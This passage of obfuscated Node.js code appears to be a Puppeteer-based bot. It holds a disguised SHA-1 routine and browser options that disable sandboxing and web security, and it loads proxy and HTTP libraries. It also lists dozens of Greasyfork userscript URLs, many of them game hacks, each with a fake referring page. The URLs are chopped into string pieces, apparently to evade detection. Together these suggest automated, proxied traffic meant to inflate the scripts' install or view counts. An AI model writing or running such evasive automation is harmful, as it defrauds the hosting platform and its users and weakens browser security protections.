            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x1b7 + 0xc * -0xdf + -0x3b * -0x26 | v >>> -0xc * -0x309 + -0x106 * -0x18 + -0x3ce1) + (w ^ x ^ y) + z + (-0x4b52dce8 + -0x2d32c2d5 + 0xe * 0x1086d319) + A[q] << -0x392 + -0x1 * 0x18f9 + 0x1c8b) << 0x108d + -0x1 * -0x1c3a + -0x2cc2 | z >>> 0x35 * 0x7d + -0x1b36 + 0x170) + (v ^ (w = w << 0x885 + 0x2678 + -0x1 * 0x2edf | w >>> -0x124c + -0x52 * -0x25 + 0x674) ^ x) + y + (0x8a94865a + -0x60feceee + 0x45443435) + A[q + (-0x1847 + -0x231b * -0x1 + -0xad3)] << 0x1dc8 + -0x19e2 + 0x1f3 * -0x2) << 0x1051 * -0x1 + -0x1 * -0x87f + -0xdf * -0x9 | y >>> -0x1f2d * 0x1 + -0x1017 + 0x2f5f) + (z ^ (v = v << 0x1594 + 0xd * 0x24a + -0x3338 | v >>> -0x11f + 0x1c82 + -0x1b61) ^ w) + x + (0xd395ee7c + 0x88d7d0e8 + -0x2f83f727 * 0x5) + A[q + (-0x16af + -0x1 * 0x149f + -0x1 * -0x2b50)] << 0x307 * -0x1 + 0x24fe + -0x2f * 0xb9) << 0x312 * -0xb + -0x1 * -0xb35 + 0x1696 | x >>> 0x1 * -0x2ae + -0x1 * -0xbf2 + -0x14f * 0x7) + (y ^ (z = z << -0x164e + 0x11 * 0x92 + 0xcba | z >>> -0x127f * 0x1 + 0x16ba + -0x439) ^ v) + w + (-0x54b95ac9 + -0x1 * -0x63542975 + 0x603f1cf5) + A[q + (0xe2a + 0x1712 + -0x1 * 0x2539)] << 0x26a + -0x642 + 0x3d8) << 0x4f9 + -0xd5e + 0x86a | w >>> 0x2151 + -0x1a * -0x119 + -0x3dc0) + (x ^ (y = y << 0x21d9 + -0x758 + -0x1a63 | y >>> -0x1cc6 + -0x7d8 * 0x1 + 0x24a0) ^ z) + v + (0x8b30 * -0x13860 + 0x688081ba + 0xb0301be7 * 0x1) + A[q + (0x4 * -0x2b4 + -0x18d2 + 0x23a6)] << -0x1 * 0x1391 + -0x1b83 + 0x2f14, x = x << -0x3 * -0x3a0 + -0x1 * 0x2373 + -0x31 * -0x81 | x >>> 0x1791 + 0x26a * 0x6 + -0x260b;
          for (; q < 0x26be + -0x3 * -0x57 + -0xd2d * 0x3; q += 0x10b1 * -0x2 + 0xa14 + 0x1753)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0xdff + -0x256 + -0xba4 | v >>> 0x14ba + -0x1a97 + 0x2 * 0x2fc) + (w & x | w & y | x & y) + z - (-0x1 * 0x463fe8b7 + -0x158726a * -0x2 + 0xb4734707) + A[q] << -0x7c0 + -0x1cec + -0x4 * -0x92b) << -0x100c + -0x2059 + 0x306a | z >>> -0x15aa + -0xc48 + -0x1 * -0x220d) + (v & (w = w << -0x10e4 + 0x28b * -0x3 + -0x77 * -0x35 | w >>> -0xe13 + -0x1 * -0x2425 + -0x1610) | v & x | w & x) + y - (-0x41055dba + -0x6146a60 + -0x4b * -0x27406fa) + A[q + (-0x102 * -0x11 + -0x2 * -0x1315 + 0x5 * -0xb0f)] << -0x3ad * 0x5 + -0xba3 + 0x1e04) << 0x56f + 0x1d * -0x8b + -0x5 * -0x211 | y >>> 0xcc3 + -0x715 + -0x593 * 0x1) + (z & (v = v << 0x1b64 + 0x1db1 + -0x12fd * 0x3 | v >>> -0x1060 + -0x9ff + 0x1a61) | z & w | v & w) + x - (0x7532b7b3 * 0x1 + 0xaa15f25a + -0xb4bf1f * 0xf7) + A[q + (0x141f + -0x269e + 0x1281)] << 0x1 * -0xc1a + -0x3 * 0x823 + -0x2483 * -0x1) << 0x1a91 + 0x677 + -0x2103 | x >>> 0x3 * 0xc6f + 0x2684 + 0x1 * -0x4bb6) + (y & (z = z << -0x2528 + -0x10dd + 0x3623 * 0x1 | z >>> -0x200e + -0x17af * 0x1 + 0x37bf) | y & v | z & v) + w - (-0x5151b42e + -0x1c09dd59 + 0xde3fd4ab) + A[q + (0xa6e + -0x233f + 0x1c * 0xe3)] << -0x11 * -0x79 + 0x1 * 0x47f + -0xc88) << 0x24e2 + -0xb75 * -0x2 + 0x1 * -0x3bc7 | w >>> -0x1c94 + 0x19c0 + 0x1 * 0x2ef) + (x & (y = y << 0x1f26 + 0x1f7 * 0x5 + -0x28db | y >>> -0x5c2 * -0x1 + -0xeff + 0x93f * 0x1) | x & z | y & z) + v - (-0x474fd * -0x169a + -0xb99d156a + 0xc5c53a5c) + A[q + (-0x1667 + -0x24 + -0xf * -0x181)] << -0x13c6 + -0x1ab3 + 0x2e79, x = x << 0x1f * 0xe9 + -0x1f6a + 0x3 * 0x11b | x >>> -0x2164 + 0x609 + 0x1b5d;
          for (; q < 0xe19 + 0x40a * 0x8 + -0x2e19; q += 0xdf * -0x29 + -0x1fd8 + 0x4394)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x1795 + 0xcf6 * -0x1 + 0x76 * -0x17 | v >>> -0x240b + 0x3a8 + -0x2 * -0x103f) + (w ^ x ^ y) + z - (-0x1aa0b479 + -0x35fddc73 + 0x863bcf16) + A[q] << -0x8 * -0x48 + -0x18f9 * 0x1 + 0x16b9) << -0x1ca9 + 0x20a1 * 0x1 + -0x3f3 * 0x1 | z >>> 0xc7 * -0x17 + -0x549 + 0x1745) + (v ^ (w = w << -0x1 * 0x82f + -0x92 * -0x11 + 0x7 * -0x33 | w >>> 0x190a + 0xbb * -0xe + -0xece * 0x1) ^ x) + y - (0x52 * -0x3d7b50 + -0x116a * -0x29681 + 0x1c3ddb60) + A[q + (-0xb83 * 0x3 + 0x1ac1 + 0x7c9)] << -0x23f * -0xd + 0x1e7d + -0x3bb0) << 0x1 * 0x209b + -0x1721 + -0x975 | y >>> 0xd6c + 0x6fd * -0x5 + 0x15a0) + (z ^ (v = v << 0x1623 * -0x1 + 0x1a17 * 0x1 + -0x3d6 | v >>> -0xb99 + -0x1c7d + 0x2818) ^ w) + x - (-0x365e5fd * -0x11 + -0x5 * -0x14f941ad + 0x2be54 * -0x27bd) + A[q + (0x17 * -0xf7 + -0x12bd + 0x4 * 0xa3c)] << -0x1472 + 0x29 * -0xb7 + -0x10f * -0x2f) << -0x1 * 0x1951 + -0xf33 + 0x2889 | x >>> -0x71d + 0x2221 + -0x1ae9) + (y ^ (z = z << 0x7e1 + 0x7 * 0x3e5 + -0x1 * 0x2306 | z >>> 0x10d6 + -0x1ceb + 0xc17) ^ v) + w - (-0x6efb7aa * -0xa + -0x5c1e66ed + -0x2f3f * -0x19dcd) + A[q + (-0x88b + -0x2239 + 0x2ac7)] << 0x243c + 0x167 + -0x25a3) << 0x1c54 + 0x17f * -0x1a + -0xa97 * -0x1 | w >>> 0x850 + 0xceb * -0x2 + -0x11a1 * -0x1) + (x ^ (y = y << 0x56c * -0x5 + -0xc81 * -0x3 + 0xa49 * -0x1 | y >>> -0x15c0 + -0x3 * 0x379 + 0x202d) ^ z) + v - (-0x2f1593ae + -0x137 * 0x299f83 + 0xbf1 * 0xcaacd) + A[q + (-0xd6 * -0x2b + -0x2202 + -0x1ec)] << -0x10de + -0x6 * 0x57 + 0x12e8, x = x << 0x737 + -0x392 * -0x3 + -0x11cf * 0x1 | x >>> 0x1 * 0xd91 + 0x9f7 * 0x3 + -0x26a * 0x12;
          this['h0'] = this['h0'] + v << -0x1 * -0xc05 + 0x1eaa + -0x2aaf, this['h1'] = this['h1'] + w << 0x1ce5 + 0x6c2 + -0x23a7, this['h2'] = this['h2'] + x << 0x1da0 + -0x23d2 + 0x1 * 0x632, this['h3'] = this['h3'] + y << 0x1a19 * -0x1 + -0xfaa + -0x1 * -0x29c3, this['h4'] = this['h4'] + z << 0x1884 + -0x9 * -0x49 + -0x1b15;
        }
        ['hex']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return e[q >> -0xca * 0x29 + 0x6 * -0x46f + 0x3b10 & 0xe1b * 0x2 + -0x1293 + 0x994 * -0x1] + e[q >> 0xa81 * 0x3 + 0x4ed + -0x2458 & -0x9b3 * 0x1 + -0x1 * 0x1c9c + 0x6 * 0x665] + e[q >> 0x1dac + 0x422 + 0x2 * -0x10dd & -0x1786 + 0x791 * -0x2 + 0x26b7 * 0x1] + e[q >> -0xc3 + -0x2c * -0x89 + -0x16b9 & 0xb * -0x116 + -0xa1a + -0x161b * -0x1] + e[q >> -0x55d * 0x6 + -0x65d * -0x3 + 0xd23 & 0x1 * -0xa99 + -0x1 * 0x2593 + 0x1 * 0x303b] + e[q >> 0x544 * -0x4 + 0x3b * 0x9b + -0xea1 & 0x1d16 * 0x1 + 0xf * -0x43 + -0x191a] + e[q >> -0x157e + 0x14 * 0xd6 + -0x1 * -0x4ca & 0xa0c + 0x6bd + -0x10ba] + e[-0x2 * -0xde2 + -0xe4d + -0xd * 0x108 & q] + e[u >> 0x20bf + -0xab * 0x11 + -0x1548 & 0x47 * 0x53 + -0x39 * 0x33 + -0xb9b * 0x1] + e[u >> 0x1974 + 0x475 + -0x1dd1 & 0x114c + -0x1de * 0x8 + -0x24d] + e[u >> 0xb * 0x157 + -0xca + -0x35 * 0x43 & -0x1 * -0x6c5 + -0x1 * 0x10da + 0xa24] + e[u >> 0x6a * -0x5 + 0x13b * -0xc + 0x10e6 & -0x1f8a + -0x2 * 0x566 + 0x2a65] + e[u >> -0x1 * -0x1333 + -0x874 * 0x1 + 0xf9 * -0xb & 0xd04 + -0xddb + 0x2 * 0x73] + e[u >> -0x3 * 0x6a1 + 0x6 * 0x399 + 0x7 * -0x3d & -0x262b + 0x11d1 * 0x2 + 0x298] + e[u >> -0x3ed + -0x1360 + -0x2f * -0x7f & -0x3f2 + 0x352 + 0xaf] + e[-0xc2 * -0x2f + 0x4c * -0x20 + -0x1 * 0x1a0f & u] + e[v >> 0x262d + -0x1a64 + 0x3d * -0x31 & 0x26 + 0x1414 + -0x3 * 0x6b9] + e[v >> 0x1587 + -0x1 * 0x1533 + -0x3c & -0x2399 + 0xf2c + 0x147c] + e[v >> -0xfb * -0x2 + -0x16e + -0x74 & -0x1805 + 0x2183 + -0x96f] + e[v >> -0x1fdd + 0x1489 * 0x1 + -0x24 * -0x51 & -0x1 * 0x22be + -0x6 * -0x8e + 0x1f79 * 0x1] + e[v >> 0x1b12 + 0x2 * 0x33d + -0x10c0 * 0x2 & 0x25 * 0x1e + 0x2171 + -0x25b8] + e[v >> 0x3e * 0x86 + -0x332 * -0x6 + -0x3398 & -0x20f9 + -0x1 * -0x13ff + 0xd09] + e[v >> 0x10e7 * -0x2 + 0x6a2 * 0x2 + 0x148e & 0x2171 + -0x12d5 + -0x5 * 0x2e9] + e[0x1e89 + -0xd * -0xc3 + -0x2861 & v] + e[w >> 0xcb5 + -0x24b + 0x1 * -0xa4e & 0x7 * 0x324 + -0x1ffd * 0x1 + 0xa10 * 0x1] + e[w >> -0x89b + 0x15a + 0x759 & 0x30 * 0xb1 + -0x1 * -0x68c + -0x27ad] + e[w >> 0xc1 * 0x17 + 0x5 * 0x62a + -0x3015 & -0x1b2b + -0x5e3 + 0x211d] + e[w >> 0x11f3 + -0x52e * -0x1 + 0x1711 * -0x1 & 0x1acd + 0x8e8 + -0x6 * 0x5f1] + e[w >> -0x973 + -0x21d5 * -0x1 + -0x1856 & 0x3 * -0xb13 + -0x11da * 0x1 + 0xee * 0x37] + e[w >> 0xe2d + -0x22d0 + 0x14ab & 0x5 * -0x24f + 0x1 * 0x180a + 0x31c * -0x4] + e[w >> 0x2b * 0x32 + -0x107e + 0x81c & 0xb23 * 0x2 + -0x2647 + -0x808 * -0x2] + e[-0x4ee + -0x53b + 0xa38 * 0x1 & w] + e[x >> -0x2 * -0x616 + -0x2119 + 0x1509 * 0x1 & 0x22c5 + -0x1f9e + 0x108 * -0x3] + e[x >> 0x1008 + 0x2 * 0x2a9 + 0xaa1 * -0x2 & -0x136f * -0x1 + 0x4dc * -0x7 + 0xea4] + e[x >> 0x1e54 + -0xe0c + -0x4 * 0x40d & -0x48d * 0x1 + 0x2154 + -0x1cb8] + e[x >> 0x60 * 0x1a + 0x6e * 0x1a + -0x14dc & -0x1d4f + 0x1ea1 + 0x11 * -0x13] + e[x >> -0x1df9 + -0x13c6 + 0x31cb & 0x2d4 + 0x1f4d + -0x2212] + e[x >> -0x1036 + 0x6a * -0x43 + -0x466 * -0xa & 0x2357 * -0x1 + 0x71 * -0xe + -0xa65 * -0x4] + e[x >> 0x1 * -0x2f1 + -0x8 * 0x1ca + 0x1 * 0x1145 & -0x119 * -0x7 + -0x854 + 0x3 * 0x3c] + e[-0x1b8e + -0x21d7 * 0x1 + -0x114 * -0x39 & x];
        }
        ['digest']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return [
            q >> 0x1685 + 0x1 * -0xc29 + -0x49 * 0x24 & -0x17eb + -0x1 * 0x166f + 0x2f59,
            q >> -0x2506 + 0x672 + 0x1ea4 & 0x106b + -0x1f79 + 0x100d,
            q >> 0xec4 + 0x581 * -0x1 + 0x8b * -0x11 & 0x200a + -0xb04 + -0x1407, -0x1c3 * -0x2 + 0x1 * -0x208f + 0x1e08 & q,
            u >> 0xecd + -0x12ef + 0x43a & -0x2 * -0xbb + -0x15df + 0x1568,
            u >> -0xca2 + 0x1d0f + -0x105d & -0x13dd + -0x18 * -0x18d + 0x15d * -0xc,
            u >> -0x232e * 0x1 + -0x6df + 0x2a15 & 0xceb + 0x16fd + -0x22e9,
            0x1b29 + 0x1046 + -0x2a70 & u,
            v >> -0x263f + 0x1dd7 + 0x1 * 0x880 & 0xa60 + -0x160 + -0x1 * 0x801,
            v >> 0x7d8 + 0x24ad + -0x2c75 & 0x5 * 0x2e3 + 0x788 + -0x14f8,
            v >> 0x217e + 0x4fa * 0x6 + -0x3f52 & -0x116f + 0x1 * 0xe22 + -0x5 * -0xdc, -0x1487 + 0x1d * -0xb + -0x1 * -0x16c5 & v,
            w >> 0xce7 + -0x1040 + -0x371 * -0x1 & 0x808 + -0xb6a + -0x461 * -0x1,
            w >> 0x1d44 + -0x1375 + 0x1 * -0x9bf & -0x7da + 0x1c4b + -0x1372,
            w >> 0x227f + 0x1081 + -0x32f8 & -0x1c52 + 0x1 * -0xa1 + 0x1df2,
            0xff5 + -0x1 * -0x1e25 + -0x2d1b & w,
            x >> -0x32f * 0xc + 0x41b * -0x1 + 0x87b * 0x5 & 0xedb + -0xc1 + -0x29f * 0x5,
            x >> -0x11db + 0x3f1 + 0xdfa & 0x1d31 + -0x11bf + -0x1 * 0xa73,
            x >> -0x1 * 0x5c7 + 0x2f * -0x4f + 0x1450 & -0x9fd + 0xa * 0x313 + -0x1 * 0x13c2, -0x24d1 + 0x237d + 0x55 * 0x7 & x
          ];
        }
        ['arrayBuffe' + 'r']() {
          var q, r;
          return this['finalize'](), q = new ArrayBuffer(0x7 * -0x50e + 0xb * -0x16 + -0x5 * -0x748), (r = new DataView(q))['setUint32'](0x139e + -0x172c + 0x38e, this['h0']), r['setUint32'](0x1 * 0xfc6 + -0x12d * 0x17 + 0xb49, this['h1']), r['setUint32'](0x2 * -0x728 + 0xaa0 + 0x44 * 0xe, this['h2']), r['setUint32'](0x1968 + 0x84a + -0x49 * 0x76, this['h3']), r['setUint32'](-0x1165 + -0x1c51 + 0x2dc6, this['h4']), q;
        }
    }
    o['prototype']['toString'] = o['prototype']['hex'], o['prototype']['array'] = o['prototype']['digest'];
    const p = k();
    return p;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = 0x1a73 + 0xe * -0x13e + -0x567 * -0x7 + (0x856 * 0x2 + 0x641 + -0xb35) * random(),
  MM_NETWORK_PATIENCE = (-0x20b2 + -0xf94 + 0x3049) * NETWORK_PATIENCE,
  me = random()['toString'](0x10e4 * 0x2 + -0x101a + -0x119e)['substring'](-0x1bc * -0x4 + -0x1134 + 0xa48, 0xb8c + 0x2 * 0x97d + -0x1e7c),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': aF(0xd, 'D8DR') + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + aG(0x28) + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': aH(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + aG(0xc) + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aH(0x2b) + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + aF(0x9, 'NRrO'),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
